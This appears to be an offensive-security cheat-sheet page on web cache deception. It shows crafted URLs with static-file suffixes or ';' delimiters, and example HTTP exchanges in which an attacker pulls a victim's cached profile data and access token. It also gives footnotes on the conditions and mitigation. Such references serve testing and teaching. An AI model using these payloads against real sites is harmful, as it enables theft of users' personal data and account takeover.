# Web Cache Deception

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Account Takeover](#account-takeover)

## Data Exfiltration

### A page containing the victim's personal data is stored in a shared cache, where the attacker can retrieve it without authentication. [^1]

- Appending a static file extension to a dynamic page
    1. Link delivered to the victim
        ```text
        https://[VULNERABLE-SERVICE]/account/profile/style.css
        ```

    2. Request the attacker sends afterwards, without a session
        ```http
        GET /account/profile/style.css HTTP/1.1
        Host: [VULNERABLE-SERVICE]
        ```

    3. Resulting response
        ```http
        HTTP/1.1 200 OK
        Content-Type: text/html
        X-Cache: HIT

        <h1>Profile</h1>
        <p>Email: [VICTIM-EMAIL]</p>
        <p>Address: [VICTIM-ADDRESS]</p>
        ```
    The origin ignores the trailing segment and returns the victim's profile, while the cache sees a `.css` file and stores it. Unlike [Cache Poisoning](./Cache_Poisoning.md), the attacker does not change what other users receive but reads what was served to the victim.

- Using a delimiter that only the origin recognizes [^2]
    ```text
    https://[VULNERABLE-SERVICE]/account/profile;style.css
    ```
    The origin treats `;` as the end of the path and returns `/account/profile`, while the cache treats the whole URL as a static file.
    - PortSwigger's research (by Martin Doyhenart), [Gotta cache 'em all: bending the rules of web cache exploitation](https://portswigger.net/research/gotta-cache-em-all)

## Account Takeover

### Session tokens, API keys, or anti-CSRF tokens included in the cached response let the attacker act as the victim. [^1]

- Retrieving a cached response that contains an access token
    1. Link delivered to the victim
        ```text
        https://[VULNERABLE-SERVICE]/api/me/avatar.png
        ```

    2. Response the attacker retrieves from the cache
        ```http
        HTTP/1.1 200 OK
        Content-Type: application/json
        X-Cache: HIT

        {"id": 1234, "email": "[VICTIM-EMAIL]", "access_token": "[VICTIM-ACCESS-TOKEN]"}
        ```

[^1]: Applies when the cache decides what to store from the URL alone, such as a file extension or a static directory, while the origin maps the same URL to a dynamic page. A `Cache-Control: no-store` header from the origin prevents it unless the cache is configured to ignore that header.
[^2]: Applies when the origin and the cache disagree on which characters end the path. For example, Spring treats `;` as the start of matrix parameters.
